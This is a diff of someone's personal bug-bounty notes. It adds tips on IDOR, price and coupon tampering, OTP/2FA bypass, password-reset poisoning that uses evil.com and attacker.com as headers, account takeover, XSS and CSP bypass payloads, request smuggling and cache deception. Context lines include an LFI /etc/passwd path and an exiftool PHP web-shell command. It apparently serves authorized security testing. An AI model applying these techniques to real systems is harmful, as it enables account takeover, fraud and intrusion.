@@ -8,12 +8,8 @@ sudo cp ~smartkelvin/go/bin/pdtm  /usr/local/bin
 
 
  $ chmod +x (tool)
-how to use files everywhere   
-# mv (tool) /usr/local/
-
-smartkelvin
-
-
+how to use files everywhere
+# mv (tool) /usr/local/bin
                                                    
    breif summary of my recon
    nmap
@@ -517,7 +513,9 @@ Ports:8443, 8080 Title: "Dashboard[Jenkins]" Product: Tomcat Hostname: example.c
 
 
      SHODAN FOR BUG HUNTING 
-     assest discovery using shodan cli                    check nahamesec video on shodan
+     assest discovery using shodan cli                   check nahamesec video on shodan
+     
+     ssl:redacted.com "200"
      
  shodan init api-key
      shodan domain -h
@@ -962,10 +960,24 @@ nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
 4. Done !!
    
    
-   ##tip   Add IDs to requests that don’t have them
+   ##tip   
+   Add IDs to requests that don’t have them
    GET /api/MyPictureList → /api/MyPictureList?user_id=<other_user_id>
 
   Pro tip: You can find parameter names to try by deleting or editing other objects and seeing the parameter names used.
+  
+  tip
+  allows try and see if you could login with any company email diplay on the browers
+  
+  tip
+  allow place  %00”  , space (-)  before and after the email and watch the response  example are smartkelvin@wearehackerone%00  smartkelvin@wearehackerone%00-
+  NOTE, allows when using google auth signup, check if you can reregister an  account with the account used in the auoth signup
+  
+  #tip
+  1. change the price with other price :100->50
+2. change the price with nagative price :100->-100
+3. change the price with other price by add nagative value: 100 ->(+-120)
+4. change the price with other price by mult by 0.5: 100->(0.5*100)
   
   
       ##tip  Try replacing parameter names
@@ -1082,6 +1094,113 @@ GET /adMin/profile ->200
 GET /admIn/profile ->200
 GET /admiN/profile ->200
 
+  tip    this is authoraization issues
+    Capture the POST request responsible for inviting any  user and send this request to repeater.
+Change the authorization token to a user token having no plan. Also changed the workspace ID parameter.
+
+  tip
+  First invite a member with “user” role permission.
+This role has no permission to see other members and plan used.
+But by directly sending the API calls. i.e. :
+https://api.target.com/workspace/restrictions
+https://api.target.com/workspace/users?limit=100&offset=0
+https://api.target.com/workspace/invitations?limit=1000&offset=0
+https://api.target.com/workspace/user_balance
+.
+  tip
+  replacing the character a of the domain name with IDN character á (for e.g. auth.target.com is now auth.tárget.com) could get you a sugar 
+
+  
+  
+  
+
+  #tip
+  
+   Review Functionality
+Some applications have an option where verified reviews are marked with some tick or it's
+mentioned. Try to see if you can post a review as a Verified Reviewer without purchasing that
+product.
+
+   tip
+ some app  provides you with an option to provide a rating on a scale of 1 to 5, try to go
+beyond/below the scale-like provide 0 or 6 or -value.
+Try to see if the same user can post multiple ratings for a product. This is an interesting
+endpoint to check for Race Conditions.
+
+  tip
+   Coupon Code Functionality
+Apply the same code more than once to see if the coupon code is reusable.
+If the coupon code is uniquely usable, try testing for Race Condition on this function by using
+the same code for two accounts at a parallel time.
+Try Mass Assignment or HTTP Parameter Pollution to see if you can add multiple coupon codes
+while the application only accepts one code from the Client Side.
+
+  tip
+  Try adding discount codes on the products which are not covered under discounted items by
+tampering with the request on the server-side.
+    **Delivery Charges Abuse **
+Try tampering with the delivery charge rates to -ve values to see if the final amount can be
+reduced.
+
+  tip
+  **Premium Feature Abuse **
+Try forcefully browsing the areas or some particular endpoints which come under premium
+accounts.
+Pay for a premium feature and cancel your subscription. If you get a refund but the feature is still
+usable, it's a monetary impact issue.
+Some applications use true-false request/response values to validate if a user is having access to
+premium features or not.
+Try using Burp's Match & Replace to see if you can replace these values whenever you browse the
+app & access the premium features.
+Always check cookies or local storage to see if any variable is checking if the user should have access
+to premium features or not.
+
+   tip
+   . Refund Feature Abuse
+Purchase a product (usually some subscription) and ask for a refund to see if the feature is still
+accessible. and aslo try currucy arbitatration by chanhe $ to E
+
+Try making multiple requests for subscription cancellation (race conditions) to see if you can get
+multiple refunds.
+
+  tip
+  also change socail media links  as javascript:alert(document.domain) and watch the responses
+
+  tip
+  Thread Comment Functionality
+Unlimited Comments on a thread
+Suppose a user can comment only once, try race conditions here to see if multiple comments are
+possible.
+
+   tip
+    **Cart/Wishlist Abuse **
+Add a product in negative quantity with other products in positive quantity to balance the amount.
+Add a product in more than the available quantity.
+Try to see when you add a product to your wishlist and move it to a cart if it is possible to move it to
+some other user's cart or delete it from there.
+
+ tip
+ 
+Suppose there is an option: comment by the verified user (or some privileged user) try to tamper
+with various parameters in order to see if you can do this activity.
+Try posting comments impersonating some other users.
+
+  tip
+  Business Flow Bypass Applications include flows that are controlled by redirects and page transfers.
+After a successful login, for example, the application will transfer the user to the money transfer
+page.During these transfers, the user’s session is maintained by a session cookie or other
+mechanism. In many cases,
+this flow can be bypassed which can lead to an error condition or information leakage. This leakage
+can help an attacker identify critical back-end information. If this flow is controlling
+and giving critical information out then it can be exploited in various use cases and scenarios How
+to test for this business logic flaw:
+• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
+• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
+• Identify business functionalities which are in specific steps (e.g. a shopping cart or wire transfer
+• Analyze all steps carefully and look for possible parameters which are added by the application
+• These parameters can be tampered through a proxy while making the transaction
+  
+
     tip 
     [ ] Test an outdata API version
     GET /v3/users_data/1234 ->401
@@ -1105,7 +1224,62 @@ GET /admiN/profile ->200
     tip
     [ ] Bypass object level authorization Add parameter onto the endpoit if not present by defualt
 GET /api_v1/messages ->200
-GET /api_v1/messages?user_id=victim_uuid ->200
+GET /api_v1/messages?user_id=victim_uuid ->20
+
+  tip
+  Critical Parameter Manipulation and Access to Unauthorized Information/Content. HTTP GET and
+POST requests are typically accompanied with several parameters when submitted to the
+application. These parameters can be in the form of name/value pairs, JSON, XML etc. Interestingly,
+these parameters can be tampered with and guessed (predicted) as well. If the business logic of the
+application is processing these parameters before validating them, it can lead to
+information/content disclosure. This is another common business logic flaw that is easy to exploit
+How to test for this business logic flaw:
+• During the profiling phase or through a proxy, observe HTTP traffic, both request and response
+• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
+the parameter and the value need to be analyzed.
+• Observe the values in the traffic and look for incrementing numbers and easily guessable values
+• This parameter’s value can be changed and one may gain unauthorized access.
+
+ tip
+  LDAP Parameter Identification and Critical Infrastructure Access** LDAP is becoming an important
+aspect for large applications and it may get integrated with ”single sign on” as well. Many
+infrastructure layer tools like Site Minder or Load Balancer use LDAP for both authentication and
+authorization. LDAP parameters can carry business logic decision flags and those can be abused and
+leveraged. LDAP filtering being done at the business application layer enable logical injections to be
+possible on those parameters. If the application is
+not doing enough validation then LDAP injection and business layer bypasses are possible.
+How to test for this business logic flaw:
+• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
+• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
+the parameter and the value need to be analyzed.
+• Analyze parameters and their values, look for ON,CN,DN etc. Usually these parameters are linked
+for the parameter taking email or usernames, these parameters can be prospective targets.
+• These target parameters can be manipulated and injected with “*” or any other LDAP specific fil
+can lead to logical bypass over LDAP and end up escalating access rights.
+ 
+   
+
+ tip
+Developer’s cookie tampering and business process/logic bypass. Cookies are an essential
+component to maintain state over HTTP. In many cases, developers are not using session cookies
+only, but instead are building data internally using session only variables. Application developers set
+new cookies on the browser at important junctures which exposes logical holes. After authentication
+logic sets several parameters based
+on credentials, developers have two options to maintain these credentials across applications. The
+developer can set the parameters in session variables or set cookies in the browser
+with appropriate values. If application developers are passing cookies, then
+they might be reverse engineered or have values that can be guessed/ deciphered. It can create a
+possible logical hole or bypass. If an attacker can identify this hole then they can exploit it with ease
+How to test for this business logic flaw:
+• During the profiling phase or through a proxy observe the HTTP traffic, both request and response
+• Analyze all cookies delivered during the profiling, some of these cookies will be defined by de
+session cookies defined by the web application server.
+• Observe cookie values in specific, look for incrementing easily guessable values across all coo
+• Cookie value can be changed and one may gain unauthorized access or logical escalation
+
+
+
+
   
 
 
@@ -1126,7 +1300,7 @@ search all the endpoints having ID which the search engine may have already inde
 use tools like arjun , paramminer
 
     
-    tip
+    tip    UPDATING ACCOUNT FIXTURES
     Sometimes when updating your account settings, they'll send your userid as a parameter. Manipulating this can sometimes result in another users profile being edited. Don't forget that if one feature is vulnerable to IDOR then it may be a site-wide issue (and don't forget to check mobile site!). Even if you do not see your ID in the post data, just simply try adding it. id=, uid=, userid=, especially if it is a GraphQL query or JSON post data (if it's PUT).
 
  tip
@@ -1418,19 +1592,6 @@ In http history (in Burp Suite) you will notice this request
 
 
 
-Bug Bounty Tips: 🐛 Working on a wide-scope target and need to quickly pinpoint Interesting assets for your security assessment? Here's a nifty one-liner to help you do just that:
-
-1️⃣ Create a list of your target/subdomains in 'targets.txt'.
-2️⃣ Use the 'httpx' tool with the '-mr' flag to search for specific keywords. For example, you can look for the term 'register' in the responses using the command like:
-
-cat targets.txt  | httpx -mr "register" 
-
-🔍 What happens next? You'll get a list of assets where the keyword 'register' appears in the HTTP responses. These assets often lead to registration or sign-up pages. Exploring these can reveal security vulnerabilities waiting to be discovered.
-
-⚙️ Want to take it a step further? Build your custom keyword lists, including terms like 'login,' 'signup,' 'admin', and more. Tailor your searches to uncover assets of interest quickly.
-
-🚀 I've used this simple yet effective technique countless times on expansive scopes to gain an edge in bug hunting. Stay proactive and stay secure! 💡💻 
-
 
 
    7)
@@ -1534,6 +1695,92 @@ There are many additional ideas you can build upon to enhance your automation ca
      try csrf on email change
      try csrf on phone no change 
      try csrf on securlity change 
+     
+     
+   7  Token Leaks In Response
+    So there are multiple ways to do it but all are same.
+    So I will sharing my method that I have learnt here .
+     Endpoints:(Register,Forget Password)
+    Steps(For Registration):
+         1. For registeration intercept the signup request that contains the data you have entered.
+         2. Click on action -> do -> intercept the response to this request.
+        3. Click forward.
+       4. Check response if that contains any link, any token or OTP.
+        
+        Steps (For password reset):
+        1. Intercept the forget password option.
+       2. Click on action -> do -> intercept the response to this request.
+         3      . Click forward.
+        4. Check response if that contains any link,any token or OTP.
+       
+       
+       Using Auth Bypass
+Check out Auth Bypass method, there is a method for OTP bypass via response manipulation, this can leads to account takeovers.
+1.Enter the wrong auth code / Password
+2.Capture a auth request in burpsuite and send it to repeater 
+3.Check for the resoponse
+4.Change the respone by manipulating the following parameters
+  {“code”:”invalid_credentials”} -> {“code”:”valid_credentials”}
+  {“verify”:”false”}             -> {“verify”:”true”}
+       
+       Password Reset Poisioning Leads To Token Theft    Password Reset Poisioning Leads To Token Theft
+       1.Go to password reset funtion.
+2.Enter email and intercept the request.
+3.Change host header to some other host i.e,
+    Host:target.com
+    Host:attacker.com
+  also try to add some headers without changing host like
+    X-Forwarded-Host: evil.com
+    Referrer: https://evil.com
+4.Forward this if you find that in next request attacker.com means you managed to successfully steal the token. :)
+
+   tip
+   create an account (victim@test.com)
+go to the account register page in another browser (i’m using firefox container ) and create an another account using the same email with \u0023 at the end (victim@test.com\u0023) with different password( i’m using burpsuite to edit the email
+   
+   
+
+   tip    ACCOUNTTAKEOVER BY  HOST HEADER INJECTION:
+  change the host header or  deliberately introduce or  full stop (period) character (“.” or a widcard or any symbols) at the end of the HOST header within the reset password request/ or any request  and proceed to transmit it. The altered header appears as follows: Host: target.com.  or Host: target.com*
+   check if any email is being sent , if yes, confirm that the website is vulnarable.
+   manuipulate the data in burp and check your responses
+     change the crafted the reset password request by adding the full URL to the top
+     add the Burp Collaborator link to the Host Header and sent the request
+     
+     
+     
+     
+    tips tips for account takeover  
+     )Checked if OTP is leaked somewhere in the response or is sent along with the request. NO it wasn’t.
+
+  Left the OTP value blank and forwarded the request as sometimes the application validates the OTP only if its value is present. 
+
+  Completely removed the ‘OTP’ parameter from the request and forwarded it. 
+
+ Passed an array of emails[“attacker.@xyz.com”,“victim.@xyz.com”]  or using ; account1@mail.com;account2@mail.com  to check how the application behaves.Does It send the same OTP to both
+accounts? 
+
+Entered the correct OTP but changed my email address to the victim’s address. 
+
+Tried to brute-force the code but there was some kind of rate limiting present. 
+
+Sometimes passing an array of numbers/OTP with the valid one might result in something interesting. 
+
+To check the randomness of the OTP I decided to send many requests at a time in the forget password endpoint. 
+   adding %00, space at the end, space at the beginning of the email 
+   
+  *****     ****    **** account takeover by server knowing you are making password reset 
+   sender the attacker password reset,
+   sender  the victim password  reset  , 
+  so now the site knows that VICTIM-EMAIL@gmail.com will reset his password ok now we’ll continue the regular process to reset the password, and when the site sends the password & password_confirmation & email we’ll replace our email with the victim's email. And voila I reseted his password successfully
+  
+  
+  ******
+   collect  employee's emails from Github and LinkedIn
+   made a request to reset the password, then intercepted it and sent it to the intruder to see which account on my list exists as admin on the site
+   
+   
+   
    
 
    
@@ -1712,222 +1959,18 @@ Note:
 7- Turnoff Intercept and notice that your login request has been fulfilled
 
 
+tip
+Browser A: The attacker opens the login page and enters credentials for an account without 2FA
 
-Bussiness Logic Error Cheatsheet          Bussiness Logic Error Cheatsheet       Bussiness Logic Error Cheatsheet
+Browser B: The attacker opens the login page and enters credentials for the victim who has 2FA enabled. Consequently, they are redirected to /login/key/random_key
 
-1. change the price with other price :100->50
-2. change the price with nagative price :100->-100
-3. change the price with other price by add nagative value: 100 ->(+-120)
-4. change the price with other price by mult by 0.5: 100->(0.5*100)
-5. Retrieving a Profile
-For example, Jack’s profile can be fetched with id=1001 and if this value
-changed to 1089 we get another user’s information. A scanner may go on and
-change the value from 1001 to **‘1001** to find SQL injection, but not to 1089 and
-would miss deducing that the application is vulnerable to authorization bypass. By changing the “
-6. Shopping Cart
-Let us consider an online store application where customers add items to their shopping cart. The
-may make it possible for attackers to bypass the authentication processes to
-directly log into the shopping cart application and avoid paying for “purchased” items.
-7. Review Functionality
-Some applications have an option where verified reviews are marked with some tick or it's
-mentioned. Try to see if you can post a review as a Verified Reviewer without purchasing that
-product.
-Some app provides you with an option to provide a rating on a scale of 1 to 5, try to go
-beyond/below the scale-like provide 0 or 6 or -ve.
-Try to see if the same user can post multiple ratings for a product. This is an interesting
-endpoint to check for Race Conditions.
-Try to see if the file upload field is allowing any exts, it's often observed that the devs miss out
-on implementing protections on such endpoints.
-Try to post reviews like some other users.
-Try performing CSRF on this functionality, often is not protected by tokens
-8. Coupon Code Functionality
-Apply the same code more than once to see if the coupon code is reusable.
-If the coupon code is uniquely usable, try testing for Race Condition on this function by using
-the same code for two accounts at a parallel time.
-Try Mass Assignment or HTTP Parameter Pollution to see if you can add multiple coupon codes
-while the application only accepts one code from the Client Side.
-Try performing attacks that are caused by missing input sanitization such as XSS, SQLi, etc. on
-this field
-Try adding discount codes on the products which are not covered under discounted items by
-tampering with the request on the server-side.
-9. **Delivery Charges Abuse **
-Try tampering with the delivery charge rates to -ve values to see if the final amount can be
-reduced.
+Browser B: The attacker substitutes the session ID with Browser A's session ID and refreshes the page
+
+Browser B: The converter page generates a JWT for the attacker, enabling successful authentication as the victim who has 2FA enabled
 
 
-Try checking for the free delivery by tampering with the params.
-10. **Currency Arbitrage **
-Pay in 1 currency say USD and try to get a refund in EUR. Due to the diff in conversion rates, it might
-be possible to gain more amount.
-11. **Premium Feature Abuse **
-Try forcefully browsing the areas or some particular endpoints which come under premium
-accounts.
-Pay for a premium feature and cancel your subscription. If you get a refund but the feature is still
-usable, it's a monetary impact issue.
-Some applications use true-false request/response values to validate if a user is having access to
-premium features or not.
-Try using Burp's Match & Replace to see if you can replace these values whenever you browse the
-app & access the premium features.
-Always check cookies or local storage to see if any variable is checking if the user should have access
-to premium features or not.
-12. Refund Feature Abuse
-Purchase a product (usually some subscription) and ask for a refund to see if the feature is still
-accessible.
-Try for currency arbitrage explained yesterday.
-Try making multiple requests for subscription cancellation (race conditions) to see if you can get
-multiple refunds.
-13. **Cart/Wishlist Abuse **
-Add a product in negative quantity with other products in positive quantity to balance the amount.
-Add a product in more than the available quantity.
-Try to see when you add a product to your wishlist and move it to a cart if it is possible to move it to
-some other user's cart or delete it from there.
-14. Thread Comment Functionality
-Unlimited Comments on a thread
-Suppose a user can comment only once, try race conditions here to see if multiple comments are
-possible.
-Suppose there is an option: comment by the verified user (or some privileged user) try to tamper
-with various parameters in order to see if you can do this activity.
-Try posting comments impersonating some other users.
-15. **Parameter Tampering **
-Tamper Payment or Critical Fields to manipulate their values
-Add multiple fields or unexpected fields by abusing HTTP Parameter Pollution & Mass Assignment
-Response Manipulation to bypass certain restrictions such as 2FA Bypass
-16. Parameter tampering can result in product price manipulation
-https://www.youtube.com/watch?v=3VMlV7j_yzg
-17. Manipulation of exam results at Semrush.Academy
-In this situation, it was possible to bypass the exam process. That is to replace the results of the
-exam with the correct ones and send a request to get the certificate right away. And to replace the
-results with the correct ones turned out, because the body of the request was json, where 1 = true,
-and empty = false.
-Steps To Reproduce:
-1. Finished exams with any answers
-2. Retake exam
-3. Send the last request of our answer
-Example body: `{"answers":
-{"503":"","504":"","505":"1","506":"","507":"","591":"1","592":"","593":"","594":"","595":"","596":"","1340":"1","
-1341":"","1342":"","1343":"","1344":"","1345":"","1351":"1","1352":"","1353":"","1354":"","1355":"","1356":"","
-1357":"","1358":"1","1359":"","1360":"","1361":"","1362":"","1363":"","1365":"1"}}
-18. Authentication flags and privilege escalations at application layer. Applications have their own
-access control lists (ACLs) and privileges. The most critical aspect of the application related to
-security is authentication. An authenticated user has access to
-the internal pages and structures that reside behind the login section. These privileges can be
-maintained by the database, LDAP, file etc. If the implementation of authorization is weak, it
-opens up possible vulnerabilities. If these vulnerabilities are identified
-during a test, then there is the potential for exploitation. This exploitation would likely include
-accessing another user’s content or becoming a higher-level user with greater permissions to do
-greater damage How to test for this business logic flaw:
-• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
-• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
-the parameter and the value need to be analyzed.
-• If the parameter name is suspicions and suggests that it has something to do with ACL/Permissio
-target.
-• Once the target is identified, the next step is evaluating the value, it can be encoded in hex,
-should do some tampering and try to define its behavior with bit of fuzzing.
-• In this case, fuzzing may need a logical approach, changing bit patterns or permission flags li
-on. Some combination of bruteforcing, logical deduction and artistic tampering will help to decip
-successful then we get a point for exploitation and end up escalating privileges or bypassing aut
-19. Critical Parameter Manipulation and Access to Unauthorized Information/Content. HTTP GET and
-POST requests are typically accompanied with several parameters when submitted to the
-application. These parameters can be in the form of name/value pairs, JSON, XML etc. Interestingly,
-these parameters can be tampered with and guessed (predicted) as well. If the business logic of the
-application is processing these parameters before validating them, it can lead to
-information/content disclosure. This is another common business logic flaw that is easy to exploit
-How to test for this business logic flaw:
-• During the profiling phase or through a proxy, observe HTTP traffic, both request and response
-• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
-the parameter and the value need to be analyzed.
-• Observe the values in the traffic and look for incrementing numbers and easily guessable values
-• This parameter’s value can be changed and one may gain unauthorized access.
-In the above case we were able to access other users profiles
 
 
-20. Developer’s cookie tampering and business process/logic bypass. Cookies are an essential
-component to maintain state over HTTP. In many cases, developers are not using session cookies
-only, but instead are building data internally using session only variables. Application developers set
-new cookies on the browser at important junctures which exposes logical holes. After authentication
-logic sets several parameters based
-on credentials, developers have two options to maintain these credentials across applications. The
-developer can set the parameters in session variables or set cookies in the browser
-with appropriate values. If application developers are passing cookies, then
-they might be reverse engineered or have values that can be guessed/ deciphered. It can create a
-possible logical hole or bypass. If an attacker can identify this hole then they can exploit it with ease
-How to test for this business logic flaw:
-• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
-• Analyze all cookies delivered during the profiling, some of these cookies will be defined by de
-session cookies defined by the web application server.
-• Observe cookie values in specific, look for incrementing easily guessable values across all coo
-• Cookie value can be changed and one may gain unauthorized access or logical escalation
-21. ** LDAP Parameter Identification and Critical Infrastructure Access** LDAP is becoming an important
-aspect for large applications and it may get integrated with ”single sign on” as well. Many
-infrastructure layer tools like Site Minder or Load Balancer use LDAP for both authentication and
-authorization. LDAP parameters can carry business logic decision flags and those can be abused and
-leveraged. LDAP filtering being done at the business application layer enable logical injections to be
-possible on those parameters. If the application is
-not doing enough validation then LDAP injection and business layer bypasses are possible.
-How to test for this business logic flaw:
-• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
-• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
-the parameter and the value need to be analyzed.
-• Analyze parameters and their values, look for ON,CN,DN etc. Usually these parameters are linked
-for the parameter taking email or usernames, these parameters can be prospective targets.
-• These target parameters can be manipulated and injected with “*” or any other LDAP specific fil
-can lead to logical bypass over LDAP and end up escalating access rights.
-22. Business Constraint Exploitation The application’s business logic should have defined rules and
-constraints that are very critical for an application. If these constraints are bypassed by an attacker,
-then it can be exploited. User
-fields that have poor design or implementation are often controlled by these business constraints. If
-business logic is processing variables controlled as hidden values then it leads to easy discovery and
-exploitation. While crawling and profiling the application, one can list all these possible different
-values and their injection places. It is easy to browse through these hidden fields and understand
-their context; if context is leveraged to control the business rules then manipulation of this
-information can lead to critical business logic vulnerabilities. How to test for this business logic flaw:
-• During the profiling phase or through a proxy observe the HTTP traffic, both the request and re
-• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
-the parameter and the value need to be analyzed.
-• Analyze hidden parameters and their values, look for business specific calls like transfer mone
-• These target parameters can be manipulated and values can be changed. It is possible to avoid 
-
-23. Business Flow Bypass Applications include flows that are controlled by redirects and page transfers.
-After a successful login, for example, the application will transfer the user to the money transfer
-page.During these transfers, the user’s session is maintained by a session cookie or other
-mechanism. In many cases,
-this flow can be bypassed which can lead to an error condition or information leakage. This leakage
-can help an attacker identify critical back-end information. If this flow is controlling
-and giving critical information out then it can be exploited in various use cases and scenarios How
-to test for this business logic flaw:
-• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
-• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
-• Identify business functionalities which are in specific steps (e.g. a shopping cart or wire tra
-• Analyze all steps carefully and look for possible parameters which are added by the application
-• These parameters can be tampered through a proxy while making the transaction. This disrupts th
-24. ** Identity or Profile Extraction** A user’s identity is one of the most critical parameters in
-authenticated applications. The identities of users are maintained using session or other forms of
-tokens. Poorly designed and
-developed applications allow an attacker to identify these token parameters from the client side and
-in some cases they are not closely maintained on the server side of the session as well. This scenario
-opens up a potential opportunity for abuse and system wide exploitation. The
-token is either using only a sequential number or a guessable username How to test for this
-business logic flaw:
-• During the profiling phase or through particular proxy observe HTTP traffic, both request and r
-• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
-• Look for parameters which are controlling profiles.
-• Once these target parameters are identified, one can decipher, guess or reverse engineer tokens
-25. File or Unauthorized URL Access and Business Information Extraction Identity Business
-applications contain critical information in their features, in the files that are exported and in the
-export functionality itself. A user can export their data in a selected file format (PDF, XLS or CSV) and
-download it. If this functionality is not carefully implemented, it can enable asset leakage. An
-attacker can extract this information from the application layer. This is one of the most common
-mistakes and easy to exploit as well. These files can be fetched directly
-from URLs or by using some internal parameters. How to test for this business logic flaw:
-• During the profiling phase or through a particular proxy, observe the HTTP traffic, both reques
-• POST/GET requests would have typical parameters either in a name-value pair, JSON, XML or Cooki
-• Identify file call functionalities based on parameter names like file, doc, dir etc. These para
-• Once a target parameter has been identified start doing basic brute force or guess work to fetc
-26. null pyloads
-27. in change password try to delete current password
-
-     
-     
 
 
              Xss    XSS         XSS           XSS
@@ -1973,6 +2016,10 @@ Use Gau or Wayback urls to passively gather urls of the target.
 Filter the parameters using grep "=" or gf patterns and store it in a new file.
 Now run Gxss or bxss on that new file.
 Check Reflected Param Manually or use some tool like dalfox
+
+  payload   “hello<form/><!><details/open/ontoggle=alert(‘W13D0M’)>”@gmail.com
+  
+  alwys check for clickhijacking when any subdomain is reflecting  xss
 
 ANALYSIS
 $cat domains.txt | gau --threads 5 > output.txt                                i think in order to reduce noice, i will stick with in scope url //time shall tell
@@ -2115,6 +2162,11 @@ Clicked "View web version" in the email, triggering the XSS alert.
 Share the Vulnerability:
 
 Obtained a URL that triggered the XSS alert and could be shared with others.
+
+
+NOTE TIP
+ WHEN an  application used AngularJS, with the library loaded from the same domain  always try to load AngularJS library without violating the CSP. We could then use Angular templating functionality to inject malicious code
+  the payload creation process involved importing the AngularJS library and using Angular directives to initiate the payload, making use of the $event.view object, which exposed the window object. This approach effectively bypassed the CSP, allowing us to execute our payload. you could also  URL-encoded the payload above and injected it to error_description parameter
 
 
 
@@ -2462,6 +2514,7 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
 
 
 
+
      USING XSS-VIBES    check docs
      first test for dangerous charaters .. this involves =batman" in url links and check if it is reflected in , if reflected, apply some apyload 
      on xss-vibes directory
@@ -2714,6 +2767,20 @@ Origin:attacker.com/target.com
 
   
     LOCAL/REMOTE FILE INCLUSION (LFI/RFI)      LOCAL/REMOTE FILE INCLUSION (LFI/RFI)                LOCAL/REMOTE FILE INCLUSION (LFI/RFI)
+    
+    
+    You can test for this issues in two ways:
+
+Manually reading the javascript code and understanding it. Specifically checking for GET parameters used within the application and appended to any URL Path.
+Inspecting the XHR Requests in the browser console and checking for some user controllable input in the path of any request made by the application.
+If you use the second option you will miss a lot of bugs because you depends of knowing what parameters are susceptible to be vulnerable. Maybe some parameter is not used in the UI but the javascript is using it.
+
+An alternative approach is to combine both methods. You can check for parameter reflection in XHR Requests and then understand how the javascript is handling that parameter.
+
+
+
+
+
     
     1) Verify the LFI vulnerability by grabbing the passwd, hosts, etc, files       /index.php?page=/etc/passwd
    2) Verify that you have access to the access log by including it through LFI       /index.php?page=/var/log/apache2/access.log
@@ -3379,6 +3446,13 @@ Exiftool is a great tool to view and manipulate exif-data. Then I will to rename
 mv pic.jpg pic.php.jpg
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
       
+    note 
+     when files  upload is only sensitive to the content-type, not the file extension. turned on intercept in Burp Suite and uploaded a PHP file, changing the content-type to image/png in that request  
+      
+      
+      check for gap tools in burp and x8 tool
+      gap to extract parameters of the same domain
+    
     
       
     
@@ -3487,15 +3561,49 @@ Here's the link to the template - https://github.com/projectdiscovery/nuclei-tem
     extract the JSON response in a file. once you have the schema, the best way is to import it into a tool like “GraphQL Voyager
            
            
+           HTTP REQUEST SMUGGLING      HTTP REQUEST SMUGGLING         HTTP REQUEST SMUGGLING
+           dump two request at a time  change the http/2 tp http/1 , and focus on  the second request that no user agent is involved 
+            example 
+             GET /test?a=a% HTTP/1.1
+            Host: admin.target.com
+         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+ 
+           GET /admin/login HTTP/1.1
+            Host: admin.target.com
+
+           
            
        
        
        
-           Web Cache Vulnerabilities 
+           Host: admin.target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+
+GET /admin/login HTTP/1.1
+Host: admin.target.com Cache possioning        Web Cache possioning        Web Cache possioning 
+           we manage to force the Load Balancer into caching our request on a specific crafted path of ours, we will be able to read our victim's sensitive data from the cached response.It wasn't straight-forward in this case
            
+  NOTE  :     Relaxed cache rules can be very dangerous, especially with URL parser confusions.  In a website that uses caching, the request must go through the CDN before it gets the the web server. This means that the URL gets parsed twice, which makes it possible for a URL parser confusion
            
+  allows check for this endpoint share/%2F..%2Fapi/auth/session?cachebuster=123   
            
-           
+   ****
+   first thing is to try is to fetch the resource with a file extension appended to the endpoint 
+   example
+   api/auth/session/test.css
+   /api/auth/session.css
+   /notifications/logo.png 
+   /stylesheet.css 
+   
+   Conditions
+So basically, two conditions are required for this vulnerability to exist:
+Web cache functionality is set for the web application to cache files by their extensions, disregarding any caching header.
+When accessing a page like http://www.example.com/home.php/non-existent.css, the web server will return the content of "home.php" for that URL.
+   
+      Mitigation
+Configure the cache mechanism to cache files only if their HTTP caching headers allow. That will solve the root cause of this issue.
+If the cache component provides the option, configure it to cache files by their content type.
+Configure the web server so that for pages such as http://www.example.com/home.php/non-existent.css, the web server doesn’t return the content of "home.php" with this URL. Instead, for example, the server should respond with a 404 or 302 response.
            
            
            
